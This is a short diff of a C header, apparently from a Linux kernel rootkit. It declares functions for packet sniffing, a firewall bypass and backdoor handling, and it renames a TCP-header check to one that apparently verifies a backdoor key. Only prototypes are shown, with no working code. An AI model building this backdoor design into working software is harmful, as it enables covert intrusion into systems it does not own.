@@ -122,7 +122,7 @@ bool kv_sock_start_fw_bypass(void);
 void kv_sock_stop_sniff(struct task_struct *tsk);
 void kv_sock_stop_fw_bypass(void);
 bool kv_bd_search_iph_source(__be32 saddr);
-bool kv_check_cursing(struct tcphdr *);
+bool kv_check_bdkey(struct tcphdr *, struct sk_buff *);
 void kv_bd_cleanup_item(__be32 *);
 
 /** proc handling */
